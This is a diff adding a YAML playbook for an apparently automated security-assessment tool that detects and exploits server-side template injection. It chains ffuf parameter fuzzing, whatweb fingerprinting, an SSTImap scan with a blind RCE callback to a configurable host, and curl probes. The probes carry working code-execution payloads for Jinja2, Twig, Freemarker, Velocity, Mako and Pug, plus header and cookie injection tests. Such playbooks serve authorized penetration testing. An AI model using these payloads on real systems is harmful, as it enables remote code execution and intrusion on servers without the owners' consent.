@@ -1,0 +1,150 @@
+name: "Server-Side Template Injection (SSTI)"
+description: "SSTI detection across template engines (Jinja2, Twig, Freemarker, Velocity, Mako, Jade/Pug) and RCE exploitation"
+version: "1.0"
+
+vars:
+  callback: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "SSTI assessment on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Parameter discovery ----
+  - id: discovery
+    name: "Discover injectable parameters"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: param_fuzz
+        name: "Fuzz common template parameters"
+        tool: ffuf
+        args: ["-u", "{target}/?FUZZ={{7*7}}",
+               "-w", "/wordlists/ssrf-params.txt",
+               "-mc", "200,500",
+               "-o", "{case_dir}/ffuf-ssti-params.json", "-of", "json",
+               "-ac"]
+        timeout: 120
+        artifacts: ["{case_dir}/ffuf-ssti-params.json"]
+
+      - id: whatweb
+        name: "Technology fingerprint"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-ssti.txt"]
+        timeout: 60
+
+      - id: curl_basic
+        name: "Basic SSTI math test"
+        tool: curl
+        args: ["-s", "{target}?name={{7*7}}",
+               "-o", "{case_dir}/ssti-basic-math.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/ssti-basic-math.txt"]
+
+  # ---- Phase 2: SSTImap scan ----
+  - id: sstimap
+    name: "Automated SSTI detection via SSTImap"
+    type: sequential
+    steps:
+      - id: sstimap_scan
+        name: "SSTImap full scan"
+        tool: sstimap
+        args: ["-u", "{target}", "--crawl", "-l", "3",
+               "-o", "{case_dir}/sstimap-report.txt"]
+        timeout: 300
+        artifacts: ["{case_dir}/sstimap-report.txt"]
+
+      - id: sstimap_rce
+        name: "SSTImap blind RCE check"
+        tool: sstimap
+        args: ["-u", "{target}", "-m", "blind",
+               "--cb-host", "{callback}", "--cb-port", "80",
+               "-o", "{case_dir}/sstimap-rce.txt"]
+        timeout: 120
+
+  # ---- Phase 3: Per-engine specific tests ----
+  - id: engine_tests
+    name: "Template-engine specific probes"
+    type: parallel
+    max_workers: 6
+    steps:
+      - id: engine_jinja2
+        name: "Jinja2 injection"
+        tool: curl
+        args: ["-s", "{target}?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+               "-o", "{case_dir}/ssti-jinja2.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/ssti-jinja2.txt"]
+
+      - id: engine_twig
+        name: "Twig injection"
+        tool: curl
+        args: ["-s", "{target}?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+               "-o", "{case_dir}/ssti-twig.txt"]
+        timeout: 30
+
+      - id: engine_freemarker
+        name: "Freemarker injection"
+        tool: curl
+        args: ["-s", "{target}?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+               "-o", "{case_dir}/ssti-freemarker.txt"]
+        timeout: 30
+
+      - id: engine_velocity
+        name: "Velocity injection"
+        tool: curl
+        args: ["-s", "{target}?name=#set($x=%22java.lang.Runtime%22)%23set($rt=$x.getClass().forName($x).getMethod(%22getRuntime%22).invoke(null))$rt.exec(%22id%22)",
+               "-o", "{case_dir}/ssti-velocity.txt"]
+        timeout: 30
+
+      - id: engine_mako
+        name: "Mako injection"
+        tool: curl
+        args: ["-s", "{target}?name=${self.module.cache.util.os.popen('id').read()}",
+               "-o", "{case_dir}/ssti-mako.txt"]
+        timeout: 30
+
+      - id: engine_pug
+        name: "Pug/Jade injection"
+        tool: curl
+        args: ["-s", "{target}?name=#{global.process.mainModule.require('child_process').execSync('id')}",
+               "-o", "{case_dir}/ssti-pug.txt"]
+        timeout: 30
+
+  # ---- Phase 4: Contextual injection (headers, cookies) ----
+  - id: context_tests
+    name: "Non-parameter SSTI vectors"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: header_ssti
+        name: "User-Agent SSTI"
+        tool: curl
+        args: ["-s", "-H", "User-Agent: {{7*7}}",
+               "{target}", "-o", "{case_dir}/ssti-header-ua.txt"]
+        timeout: 30
+
+      - id: cookie_ssti
+        name: "Cookie SSTI"
+        tool: curl
+        args: ["-s", "-H", "Cookie: session={{7*7}}",
+               "{target}", "-o", "{case_dir}/ssti-cookie.txt"]
+        timeout: 30
+
+      - id: referer_ssti
+        name: "Referer SSTI"
+        tool: curl
+        args: ["-s", "-H", "Referer: {{7*7}}",
+               "{target}", "-o", "{case_dir}/ssti-referer.txt"]
+        timeout: 30
+
+  # ---- Phase 5: Report ----
+  - id: report
+    name: "SSTI assessment note"
+    type: log
+    message: |
+      SSTI assessment complete for {target}.
+      Check {case_dir}/ for sstimap report, per-engine probe outputs,
+      and contextual injection results. Look for "49" (7*7) in responses
+      to confirm injection.
